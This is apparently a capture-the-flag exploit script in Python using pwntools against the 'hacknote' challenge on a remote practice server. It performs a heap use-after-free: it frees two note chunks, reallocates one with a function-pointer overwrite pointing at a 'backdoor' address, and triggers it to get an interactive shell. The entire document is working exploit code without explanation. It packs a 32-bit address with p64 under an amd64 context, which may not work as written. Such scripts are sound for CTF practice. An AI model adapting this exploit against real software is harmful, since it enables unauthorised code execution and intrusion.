from pwn import *

# io = process("hacknote")
io = remote("node5.buuoj.cn", 27618)
context(os="linux", arch="amd64", log_level="debug")

def add(size, content):
    io.sendafter(b'Your choice :', b'1')
    io.sendafter(b'Note size :', str(size))
    io.sendafter(b'Content :', content)


def delete(index):
    io.sendafter(b'Your choice :', b'2')
    io.sendafter(b'Index :', str(index))


def printf(index):
    io.sendafter(b'Your choice :', b'3')
    io.sendafter(b'Index :', str(index))

backdoor = 0x08048945

add(40, b"aaaa")  # chunk0
add(40, b"bbbb")  # chunk1
# gdb.attach(io)

delete(0)
delete(1)
# gdb.attach(io)
add(8, p64(backdoor))
# gdb.attach(io)
printf(0)

io.interactive()